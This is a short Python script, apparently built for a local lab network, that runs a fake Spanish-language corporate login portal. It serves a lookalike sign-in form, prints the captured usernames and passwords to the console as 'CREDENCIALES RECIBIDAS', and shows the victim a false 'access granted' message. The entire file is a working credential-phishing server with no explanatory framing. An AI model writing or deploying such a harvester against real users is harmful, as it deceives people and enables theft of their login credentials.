from http.server import BaseHTTPRequestHandler, HTTPServer
import urllib.parse

FORM = """<!doctype html><html><head><meta charset='utf-8'><title>Portal Corporativo</title></head>
<body style='font-family:sans-serif;max-width:360px;margin:60px auto'>
<h2>Portal Interno - Iniciar sesion</h2>
<form method='POST' action='/login'>
<p>Usuario:<br><input name='usuario' style='width:100%'></p>
<p>Contrasena:<br><input name='clave' type='password' style='width:100%'></p>
<p><button type='submit'>Ingresar</button></p>
</form></body></html>"""

class H(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-Type','text/html; charset=utf-8')
        self.end_headers()
        self.wfile.write(FORM.encode())
    def do_POST(self):
        n = int(self.headers.get('Content-Length', 0))
        data = self.rfile.read(n).decode()
        print(">>> CREDENCIALES RECIBIDAS:", urllib.parse.parse_qs(data))
        self.send_response(200)
        self.send_header('Content-Type','text/html; charset=utf-8')
        self.end_headers()
        self.wfile.write("<h3>Acceso correcto. Bienvenido.</h3>".encode())

print("Servidor falso en http://192.168.56.1  (Ctrl+C para detener)")
HTTPServer(('0.0.0.0', 80), H).serve_forever()